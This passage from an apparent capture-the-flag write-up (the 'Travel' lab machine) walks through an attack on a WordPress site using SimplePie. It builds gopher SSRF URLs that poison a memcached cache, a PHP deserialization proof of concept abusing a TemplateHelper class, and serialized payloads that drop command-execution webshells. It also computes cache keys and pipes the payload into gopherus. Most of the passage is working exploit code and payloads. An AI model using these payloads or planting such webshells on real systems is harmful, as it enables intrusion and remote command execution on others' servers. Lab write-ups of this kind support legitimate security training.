</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?custom_feed_url=gopher://LOCALHOST:11211/_%0d%0aversion%0d%0a
</span></span></code></pre></td></tr></table></div></div><p>This is maybe working but I don&rsquo;t think we will obtain an output so let&rsquo;s try
a RCE directly.</p><p>To get a RCE we have to know a Class where we can use deserialization,
hopefully there is <code>TemplateHelper</code> class in <code>template.php</code>.</p><p>Let&rsquo;s create a PoC for serialization:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>TemplateHelper</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$file</span><span class=p>,</span> <span class=nx>string</span> <span class=nv>$data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>(</span><span class=nv>$file</span><span class=p>,</span> <span class=nv>$data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>    	<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>init</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>private</span> <span class=k>function</span> <span class=nf>init</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$file</span><span class=p>,</span> <span class=nx>string</span> <span class=nv>$data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span> <span class=o>=</span> <span class=nv>$file</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span> <span class=o>=</span> <span class=nv>$data</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nx>file_put_contents</span><span class=p>(</span><span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/logs/&#39;</span><span class=o>.</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>file</span><span class=p>,</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$obj</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>TemplateHelper</span><span class=p>(</span><span class=s2>&#34;cyfun.php&#34;</span><span class=p>,</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;shell.php&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nv>$serialized</span> <span class=o>=</span> <span class=nx>serialize</span><span class=p>(</span><span class=nv>$obj</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$serialized</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p>With the class we will be able to write a file into the log folder.
I wanted to write a php webshell with <a href=https://github.com/epinna/weevely3>weevely</a> but <a href=https://github.com/epinna/weevely3>weevely</a> generated shell
contains a lot of <code>@</code> chars that are disabled. So I had to use a simpler
webshell, something like <a href=https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985>easy-simple-php-webshell.php</a>
or <a href=https://gist.github.com/sente/4dbb2b7bdda2647ba80b>Simple-Backdoor-One-Liner.php</a>.</p><p>Then we can serialize it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=err>$</span> <span class=nx>php</span> <span class=nx>serialize</span><span class=o>.</span><span class=nx>php</span> <span class=mi>2</span><span class=o>&gt;/</span><span class=nx>dev</span><span class=o>/</span><span class=k>null</span> <span class=o>|</span> <span class=nx>tr</span> <span class=o>-</span><span class=nx>d</span> <span class=s1>&#39;\n&#39;</span>
</span></span><span class=line><span class=cl><span class=nx>O</span><span class=o>:</span><span class=mi>14</span><span class=o>:</span><span class=s2>&#34;TemplateHelper&#34;</span><span class=o>:</span><span class=mi>2</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;TemplateHelperfile&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>9</span><span class=o>:</span><span class=s2>&#34;cyfun.php&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;TemplateHelperdata&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>113</span><span class=o>:</span><span class=s2>&#34;&lt;?php if(isset(</span><span class=si>$_REQUEST[&#39;cmd&#39;]</span><span class=s2>)){ echo &#34;</span><span class=o>&lt;</span><span class=nx>pre</span><span class=o>&gt;</span><span class=s2>&#34;; </span><span class=si>$cmd</span><span class=s2> = (</span><span class=si>$_REQUEST[&#39;cmd&#39;]</span><span class=s2>); system(</span><span class=si>$cmd</span><span class=s2>); echo &#34;</span><span class=o>&lt;/</span><span class=nx>pre</span><span class=o>&gt;</span><span class=s2>&#34;; die; }?&gt;&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>Once encoded in the gopher payload:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gopher://LOCALHOST:11211/_%0d%0aset%20SpyD3r%204%200%20216%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:113:%22%3C%3Fphp%20if%28isset%28%24_REQUEST%5B%27cmd%27%5D%29%29%7B%20echo%20%22%3Cpre%3E%22%3B%20%24cmd%20%3D%20%28%24_REQUEST%5B%27cmd%27%5D%29%3B%20system%28%24cmd%29%3B%20echo%20%22%3C/pre%3E%22%3B%20die%3B%20%7D%3F%3E%22%3B%7D%0d%0a
</span></span></code></pre></td></tr></table></div></div><p>But where are stored the templates?
The theme is the default WordPress one, the css is located at
<a href=http://blog.travel.htb/wp-content/themes/twentytwenty/style.css>http://blog.travel.htb/wp-content/themes/twentytwenty/style.css</a>
so the templates will be here too, eg. <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/template.php>http://blog.travel.htb/wp-content/themes/twentytwenty/template.php</a></p><p>This mean that our webshell should be uploaded at <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php>http://blog.travel.htb/wp-content/themes/twentytwenty/logs/cyfun.php</a>
so our paylaod was not executed.</p><p>I think it&rsquo;s due to <a href=https://www.php.net/manual/en/function.escapeshellarg.php>escapeshellarg</a> escaping
the quotes.</p><p>PS: the debug feature can also be accessed directly <a href=http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php>http://blog.travel.htb/wp-content/themes/twentytwenty/debug.php</a></p><p>So let&rsquo;s try with a shell not using quotes:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nx>system</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ php serialize.php 2&gt;/dev/null | tr -d &#39;\n&#39;
</span></span><span class=line><span class=cl>O:14:&#34;TemplateHelper&#34;:2:{s:20:&#34;TemplateHelperfile&#34;;s:9:&#34;cyfun.php&#34;;s:20:&#34;TemplateHelperdata&#34;;s:26:&#34;&lt;?php system($_GET[1]); ?&gt;&#34;;}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>gopher://127.0.0.1:11211/_%0d%0aset%20SpyD3r%204%200%20128%0d%0aO:14:%22TemplateHelper%22:2:%7Bs:20:%22TemplateHelperfile%22%3Bs:9:%22cyfun.php%22%3Bs:20:%22TemplateHelperdata%22%3Bs:26:%22%3C%3Fphp%20system%28%24_GET%5B1%5D%29%3B%20%3F%3E%22%3B%7D%0d%0a
</span></span></code></pre></td></tr></table></div></div><p>Also Gopherus is hardcoding the key where it set the value to <code>SpyD3r</code> (this must be the reason why). But this
key is never called so the deserialization is never triggered.</p><p>Let&rsquo;s get back to the line where the content is cached:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$simplepie</span><span class=o>-&gt;</span><span class=na>set_cache_location</span><span class=p>(</span><span class=s1>&#39;memcache://127.0.0.1:11211/?timeout=60&amp;prefix=xct_&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>The caching is done by <a href=https://simplepie.org/>simplepie</a> with the function <a href=https://simplepie.org/wiki/reference/simplepie/set_cache_location>set_cache_location()</a>.
We can also see there is a 60 second timeout so after that the cache may expire
and the keys are prefixed with <code>xct_</code>.</p><p>If we search the <code>set_cache_location()</code> function on the source hosted on github
we can see the function is calling the class method <code>cache_location</code>.</p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L901-L909</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span><span class=lnt>9
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd>	 * Set the file system location where the cached files should be stored
</span></span></span><span class=line><span class=cl><span class=sd>	 *
</span></span></span><span class=line><span class=cl><span class=sd>	 * @param string $location The file system location.
</span></span></span><span class=line><span class=cl><span class=sd>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>set_cache_location</span><span class=p>(</span><span class=nv>$location</span> <span class=o>=</span> <span class=s1>&#39;./cache&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_location</span> <span class=o>=</span> <span class=p>(</span><span class=nx>string</span><span class=p>)</span> <span class=nv>$location</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>Searching for <code>cache_location</code> I saw that both class
<code>SimplePie_Cache_Memcache</code> (<code>library/SimplePie/Cache/Memcache.php</code>) and
<code>SimplePie_Cache_Memcached</code> (<code>/library/SimplePie/Cache/Memcached.php</code>) are
implementing <code>SimplePie_Cache_Base</code> interface (<code>library/SimplePie/Cache/Base.php</code>).</p><p>Both are similar,
<a href=https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99>https://github.com/simplepie/simplepie/blob/a72e1dfafe7870affdae3edf0d9a494e4fa31bc6/library/SimplePie/Cache/Memcached.php#L78-L99</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>    <span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd>     * Create a new cache object
</span></span></span><span class=line><span class=cl><span class=sd>     * @param string $location Location string (from SimplePie::$cache_location)
</span></span></span><span class=line><span class=cl><span class=sd>     * @param string $name     Unique ID for the cache
</span></span></span><span class=line><span class=cl><span class=sd>     * @param string $type     Either TYPE_FEED for SimplePie data, or TYPE_IMAGE for image data
</span></span></span><span class=line><span class=cl><span class=sd>     */</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$location</span><span class=p>,</span> <span class=nv>$name</span><span class=p>,</span> <span class=nv>$type</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;host&#39;</span>   <span class=o>=&gt;</span> <span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;port&#39;</span>   <span class=o>=&gt;</span> <span class=mi>11211</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;extras&#39;</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=s1>&#39;timeout&#39;</span> <span class=o>=&gt;</span> <span class=mi>3600</span><span class=p>,</span> <span class=c1>// one hour
</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=s1>&#39;prefix&#39;</span>  <span class=o>=&gt;</span> <span class=s1>&#39;simplepie_&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span> <span class=o>=</span> <span class=nx>SimplePie_Misc</span><span class=o>::</span><span class=na>array_merge_recursive</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=p>,</span> <span class=nx>SimplePie_Cache</span><span class=o>::</span><span class=na>parse_URL</span><span class=p>(</span><span class=nv>$location</span><span class=p>));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>name</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=p>[</span><span class=s1>&#39;extras&#39;</span><span class=p>][</span><span class=s1>&#39;prefix&#39;</span><span class=p>]</span> <span class=o>.</span> <span class=nx>md5</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>$name</span><span class=s2>:</span><span class=si>$type</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Memcached</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache</span><span class=o>-&gt;</span><span class=na>addServer</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=p>[</span><span class=s1>&#39;host&#39;</span><span class=p>],</span> <span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>options</span><span class=p>[</span><span class=s1>&#39;port&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>The extra options timeout & prefix will be overriden by the ones we saw in
the template. Then the key is the concatenation of
the prefix <code>xct_</code> + the md5 of the name (unique id), colon & type (TYPE_FEED).
In <code>library/SimplePie/Cache/Base.php</code> we can see that <code>TYPE_FEED = 'spc'</code>.</p><p>So we have something like that <code>xct_ + MD5( UNIQUE_ID? ":spc")</code> but we still need
to determine how <code>UNIQUE_ID</code> is generated.</p><p>For that we have to look at the main class (in <code>library/SimplePie.php</code>) when
SimplePie is initialized (<code>$simplepie->init();</code>).</p><p><code>set_cache_name_function</code></p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1117-L1128</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd>	 * Set callback function to create cache filename with
</span></span></span><span class=line><span class=cl><span class=sd>	 *
</span></span></span><span class=line><span class=cl><span class=sd>	 * @param mixed $function Callback function
</span></span></span><span class=line><span class=cl><span class=sd>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=k>function</span> <span class=nf>set_cache_name_function</span><span class=p>(</span><span class=nv>$function</span> <span class=o>=</span> <span class=s1>&#39;md5&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nx>is_callable</span><span class=p>(</span><span class=nv>$function</span><span class=p>))</span>
</span></span><span class=line><span class=cl>		<span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_name_function</span> <span class=o>=</span> <span class=nv>$function</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L535-L540</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>	<span class=sd>/**
</span></span></span><span class=line><span class=cl><span class=sd>	 * @var string Function that creates the cache filename
</span></span></span><span class=line><span class=cl><span class=sd>	 * @see SimplePie::set_cache_name_function()
</span></span></span><span class=line><span class=cl><span class=sd>	 * @access private
</span></span></span><span class=line><span class=cl><span class=sd>	 */</span>
</span></span><span class=line><span class=cl>	<span class=k>public</span> <span class=nv>$cache_name_function</span> <span class=o>=</span> <span class=s1>&#39;md5&#39;</span><span class=p>;</span>
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1377</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>        <span class=nv>$cache</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>registry</span><span class=o>-&gt;</span><span class=na>call</span><span class=p>(</span><span class=s1>&#39;Cache&#39;</span><span class=p>,</span> <span class=s1>&#39;get_handler&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_location</span><span class=p>,</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_name_function</span><span class=p>,</span> <span class=nv>$url</span><span class=p>),</span> <span class=s1>&#39;spc&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1714</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>          <span class=nv>$cache</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>registry</span><span class=o>-&gt;</span><span class=na>call</span><span class=p>(</span><span class=s1>&#39;Cache&#39;</span><span class=p>,</span> <span class=s1>&#39;get_handler&#39;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_location</span><span class=p>,</span> <span class=nx>call_user_func</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>cache_name_function</span><span class=p>,</span> <span class=nv>$file</span><span class=o>-&gt;</span><span class=na>url</span><span class=p>),</span> <span class=s1>&#39;spc&#39;</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>So what I called the <code>UNIQUE_ID</code> is generated like this <code>md5($url)</code>.</p><p><a href=https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376>https://github.com/simplepie/simplepie/blob/ae49e2201b6da9c808e5dac437aca356a11831b4/library/SimplePie.php#L1376</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl>				<span class=nv>$url</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>feed_url</span> <span class=o>.</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>force_feed</span> <span class=o>?</span> <span class=s1>&#39;#force_feed&#39;</span> <span class=o>:</span> <span class=s1>&#39;&#39;</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p><code>$url</code> is the <code>feed_url</code>.</p><p><code>"xct_" + MD5( MD5(feed_url) + ":spc")</code></p><p>So now which URL do we want to poison? We are forced to make it in two steps.
Because poisoning the URL we are attacking with is impossible as we need
the hash of the URL but the URL contains the cache that is forged with the
URL hash, so it&rsquo;s recursive.
Else we have to poison an arbitrary URL that we can compute in advance.
In the template code if no <code>custom_feed_url</code> is provided, the default one
<a href=http://www.travel.htb/newsfeed/customfeed.xml>http://www.travel.htb/newsfeed/customfeed.xml</a> is used instead.
We can compute it like that:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s &#34;$(printf %s &#39;http://www.travel.htb/newsfeed/customfeed.xml&#39; | md5sum | cut -d &#39; &#39; -f 1):spc&#34; | md5sum | cut -d &#39; &#39; -f 1
</span></span><span class=line><span class=cl>4e5612ba079c530a6b1f148c0b352241
</span></span></code></pre></td></tr></table></div></div><p>The cache key is <code>xct_4e5612ba079c530a6b1f148c0b352241</code>.</p><p>So now here is the two steps attack:</p><ol><li>Poison the cache with the with our gopher request</li><li>Call <a href=http://blog.travel.htb/awesome-rss/>http://blog.travel.htb/awesome-rss/</a> without custom feed to trigger the cache (within 60 seconds)</li></ol><p>That will result in our shell being written to the server.</p><p>We have to replace <code>SpyD3r</code> with <code>xct_4e5612ba079c530a6b1f148c0b352241</code>.</p><p>Also we have to understand the <a href=https://www.tutorialspoint.com/memcached/memcached_set_data.htm>Memcached - Set Data</a> structure</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>set key flags exptime bytes [noreply]
</span></span><span class=line><span class=cl>value
</span></span></code></pre></td></tr></table></div></div><p>By default gopherus set the following:</p><ul><li>flags: 4 (an arbitrary integer)</li><li>exptime: 0 (no expiration)</li><li>bytes: 128 (size in bytes of the data block)</li></ul><p>That seems good. Also earlier I was copy-pasting the serialized payload into gopherus
so some unprintable characters were missing. The proper solution is to directly pipe
the output into it.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>php</span> <span class=n>serialize</span><span class=o>.</span><span class=n>php</span> <span class=mi>2</span><span class=o>&gt;/</span><span class=n>dev</span><span class=o>/</span><span class=n>null</span> <span class=o>|</span> <span class=n>gopherus</span> <span class=o>--</span><span class=n>exploit</span> <span class=n>phpmemcache</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=n>________</span>              <span class=o>.</span><span class=n>__</span>
</span></span><span class=line><span class=cl> <span class=o>/</span>  <span class=n>_____</span><span class=o>/</span>  <span class=n>____</span> <span class=n>______</span> <span class=o>|</span>  <span class=o>|</span><span class=n>__</span>   <span class=n>___________</span> <span class=n>__</span> <span class=n>__</span>  <span class=n>______</span>
</span></span><span class=line><span class=cl><span class=o>/</span>   \  <span class=n>___</span> <span class=o>/</span>  <span class=n>_</span> \\<span class=n>____</span> \<span class=o>|</span>  <span class=o>|</span>  \<span class=n>_</span><span class=o>/</span> <span class=n>__</span> \<span class=n>_</span>  <span class=n>__</span> \  <span class=o>|</span>  \<span class=o>/</span>  <span class=n>___</span><span class=o>/</span>
